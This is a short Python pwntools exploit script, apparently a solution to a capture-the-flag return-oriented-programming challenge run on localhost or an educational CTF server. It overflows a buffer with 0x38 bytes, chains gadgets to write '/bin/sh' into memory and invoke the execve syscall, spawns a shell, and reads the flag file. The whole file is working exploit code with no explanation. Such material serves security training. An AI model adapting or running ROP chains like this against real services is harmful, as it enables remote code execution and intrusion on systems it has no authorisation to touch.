#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

y = remote( 'localhost' , 10173 )
#y = remote( 'edu-ctf.csie.org' , 10173 )
#y = process( '../rop/share/rop' )
#pause()


pop_rax = 0x0000000000415714
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004100f3
pop_rdx = 0x0000000000449935
mov_q_rdi_rsi = 0x000000000044709b # mov qword ptr [rdi], rsi ; ret
syscall = 0x000000000047b68f

pop_rdx_rsi = 0x000000000044beb9

bss = 0x6b6030

p = flat(
    'a' * 0x38,
    pop_rdi,
    bss,
    pop_rsi,
    '/bin/sh\0',
    mov_q_rdi_rsi,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3b,
    syscall
)

y.sendlineafter( ':D' , p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()